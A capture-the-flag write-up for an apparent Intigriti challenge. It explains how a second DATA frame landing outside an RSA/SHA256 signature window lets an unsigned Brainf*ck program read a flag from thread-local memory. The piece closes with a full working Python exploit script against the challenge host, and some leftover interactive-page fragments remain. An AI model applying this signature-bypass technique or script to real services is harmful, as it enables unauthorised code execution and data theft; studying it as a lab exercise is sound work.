01 Overview

Intigriti's November 2026 CTF (challenge-1126.challenges.intigriti.io) served up superfastserver - a custom binary protocol running over HTTPS with a Brainf*ck executor at its heart. Challenge by @whatevicanhaz.

The goal: read /the_real.flag. The server loads the flag into thread-local memory at startup and signs BF programs with RSA-2048 - only signed programs execute. The only way out is through the BF write callback.

Short version: send two DATA frames. The second one overwrites the BF instruction pointer but lands outside the SHA256 hash window - RSA still validates, BF executor runs your program.

02 Protocol

Finding the SECRET: the challenge page (view-source:https://challenge-1126.challenges.intigriti.io/) embeds the 99-byte auth code as a comment in the HTML. Standard CTF convention - the challenge gives you the key, the trick is knowing where to look. curl https://challenge-1126.challenges.intigriti.io/ | grep -i secret finds it immediately.

Frame format: 'w'(1) + SIZE(4,LE) + CMD(4) + payload

Sending HELP (after the 99-byte auth secret) returns a signed template:

SECRET + HELP  →  ACK
                     + CODE (396 B - BF interpreter, x86-64)
                     + DATA (424 B - signed BF program)
                     + SIGN (256 B - RSA-2048 signature)
                     + EXEC

The challenge gives you one URL and no documentation. You curl it - binary garbage. xxd | head: byte 0 is 0x77 ('w'), then 4-byte LE fields, then ASCII strings scattered through. strings on the full response reveals the command set: HELP, CODE, DATA, SIGN, EXEC, NAKH, ACK. Custom binary protocol, length-prefixed frames. Twenty minutes of Python later you have a parser. You send HELP, you get back three frames: 396 bytes of x86-64 machine code, 424 bytes of Brainf*ck source, 256 bytes of RSA-2048 signature. The server runs a signed BF interpreter. First question: what does the signed program actually output?

Step 1 - Baseline EXEC (signed program runs)

"I hope you like this so far. Keep going!" - the server is cheering us on. We intend to disappoint it in the most technical way possible.

The obvious attack: replace the BF program with one that reads TLS[-0x60] (where the flag lives) and outputs the bytes via the '.' write callback. The obstacle: RSA-2048 rejects any DATA payload it didn't sign. Before trying to bypass it, I needed to understand exactly what it hashes. So I extracted the CODE frame from the HELP response (body[9 : 9+code_sz]), wrote it to disk, and ran objdump -d on it.

Three things in that disassembly decide the whole exploit.

BF executor - calling convention

; rdi = DATA payload pointer  ([rbp-0x4a0])
; rsi = BF tape start = TLS[-0x160]
; '.' → send(socket, &*dp, 1, 0)   write callback 0x5c30
; ',' → recv(socket, &*dp, 1, 0)   read  callback 0x5c70

Flag in TLS (from fopen/fread at 0x5d50)

TLS[-0x60 .. -0x51]  =  flag[ 0..15]   # 'INTIGRITI{...'
TLS[-0x10]           =  flag[80]        # '}'

BF tape start: TLS[-0x160]
Distance to flag: 0x160 - 0x60 = 256 cells → need '>' × 256

EXEC handler - BF invocation & hash

66f7: add rdi, [rbp-0x4a0]    ; ← set by LAST DATA handler
6707: lea rsi, [rcx-0x160]    ; tape = TLS[-0x160]

; SHA256 input:
; start  = recv_buffer[CODE_payload_start]
; length = [rbp-0x498] + [rbp-0x4a8]  = CODE_SIZE + DATA_SIZE

04 Dead Ends

struct.pack('<I', len+n)extend DATA_SIZE build_frame(b'EXEC', custom_bf)inject via EXEC xxd responsedecode NAKH reason bytes python3 -c SHA256manual hash window calc
Extend DATA payload: struct.pack('<I', len(data)+n) → DATA_SIZE changes → hash changes → NAKHNAKHNAK
Inject BF into EXEC frame: build_frame(b'EXEC', custom_bf) → EXEC body is ignored - BF reads from [rbp-0x4a0] (DATA pointer), not EXEC payload
SIGN SIZE trick: for SIZE < 65536, byte[2] of LE encoding is 0x00 → BF interpreter hits a null byte and stops immediately

Attempt #1: brute-force elegance. Just stuff our custom BF at the end of the DATA payload. The hash can't cover everything, can it?

Dead end - extending DATA payload
click Run to replay

Nine NACKs. The server rejects everything. The SHA256 covers CODE_SIZE + DATA_SIZE bytes starting from the CODE frame - change one byte of DATA, the size field changes, the hash changes, the signature fails. No way to extend the payload without breaking the check. No way to modify DATA without changing its size. Dead end.

So I went back to the disassembly. I read the EXEC handler line by line, looking for anything off. And then: 66f7: add rdi, [rbp-0x4a0]. The BF instruction pointer is loaded from a stack slot. I grepped for where that slot is written - it's in the DATA handler. The DATA handler stores the payload pointer to [rbp-0x4a0] every time it runs. Every time it runs. And nothing in the code limits it to one DATA frame.

SHA256 hashes CODE payload + DATA1 payload = 820 bytes starting at offset 108. DATA2 arrives at offset 941 - 13 bytes past the hash boundary. RSA validates → passes. BF executor reads from DATA2.

DATA2 is outside the hash window → RSA still validates (covers DATA1). But [rbp-0x4a0] now points to DATA2 → BF runs our custom program.

Custom BF program (417 bytes)

'>' * 256    # dp: 0 → TLS[-0x60] = flag[0]
'.>' * 80    # output byte, advance dp -x80
'.'          # final byte: flag[80] = '}'
BF memory tape · 350 cells (TLS[-0x160] to TLS[+0x05e]) · ready
tape (TLS[-0x160..-0x61]) flag zone (TLS[-0x60..-0x10], 81 bytes) dp cursor flag byte read
Gotcha: .×81 outputs flag[0] 81 times (got 81 × I). Need .> to advance dp between reads.

The structure of the attack clicks into place. The SHA256 window ends at recv_buffer + CODE_SIZE + DATA_SIZE - bytes that only cover the first DATA frame. A second DATA frame lands outside that window. RSA never sees it. But the DATA handler runs twice, and the second run overwrites [rbp-0x4a0] with the pointer to DATA2. When EXEC fires the BF interpreter, it reads from DATA2 - our custom program.

RSA signs a permission slip for DATA1. We hand the BF executor DATA2. The server doesn't notice because nobody told RSA to check what comes after the hash window.

Final exploit - double DATA frame
click Run to replay

It works. ACK×5, then 81 bytes of TLS memory arriving via the write callback, plain text. The server validated the signature (which covers DATA1), ran the BF interpreter (which reads from DATA2), and had no idea anything was wrong. RSA-2048 is very good at checking things that aren't there.

📄 ctf1126_poc.py - full standalone exploit

Python 3 · no pip installs · ~5 seconds to flag

#!/usr/bin/env python3 -I
"""Minimal exploit - Intigriti CTF 1126. No pip installs."""
import socket, ssl, struct

TARGET = "challenge-1126.challenges.intigriti.io"
SECRET = b"SUPER_SECRET_CHALLENGE_AUTH_CODE_THAT_CANT_BE_BRUTE_FORCED_1337_INTIGRITI_341465b5b427f6e7c2125b300a74a033"

def build_frame(cmd, payload=b''):
    return b'w' + struct.pack('<I', len(payload)) + cmd + payload

def tls_req(body, timeout=20):
    ctx = ssl.create_default_context()
    s = socket.create_connection((TARGET, 443), timeout=timeout)
    s = ctx.wrap_socket(s, server_hostname=TARGET)
    req = (b"POST /custom_protocol HTTP/1.1\r\nHost: " + TARGET.encode() +
           b"\r\nContent-Type: application/octet-stream\r\nContent-Length: " +
           str(len(body)).encode() + b"\r\nConnection: close\r\n\r\n") + body
    s.sendall(req)
    resp = b''
    s.settimeout(10)
    while True:
        try:
            chunk = s.recv(65536)
            if not chunk: break
            resp += chunk
        except: break
    s.close()
    return resp.split(b'\r\n\r\n', 1)[1] if b'\r\n\r\n' in resp else b''

def parse_help(body):
    off = 4
    code_sz = struct.unpack_from('<I', body, off+1)[0]
    code = body[off+9 : off+5+code_sz][:396]
    off += 1 + 4 + 4 + code_sz
    if body[off:off+1] == b'\x00':
        rest = body[off+5:]
        end = rest.index(b'\x77')
        data = rest[:end]
        off += 5 + end
    else:
        data_sz = struct.unpack_from('<I', body, off+1)[0]
        data = body[off+9 : off+5+data_sz]
        off += 1 + 4 + 4 + data_sz
    sign_sz = struct.unpack_from('<I', body, off+1)[0]
    sign = body[off+9 : off+5+sign_sz]
    return code, data, sign

code, data, sign = parse_help(tls_req(SECRET + build_frame(b'HELP')))
bf = b'>' * 256 + b'.>' * 80 + b'.'
bf_padded = bf + b'\x01' * (len(data) - len(bf))
exploit = (SECRET
    + build_frame(b'CODE', code)
    + build_frame(b'DATA', data)
    + build_frame(b'DATA', bf_padded)
    + build_frame(b'SIGN', sign)
    + build_frame(b'EXEC'))
result = tls_req(exploit)
clean = result
while clean.startswith(b'ACK\x00'): clean = clean[4:]
flag = clean.rstrip(b'\x00')
if b'INTIGRITI' in flag:
    idx = flag.index(b'INTIGRITI')
    print(flag[idx:idx+100].decode())
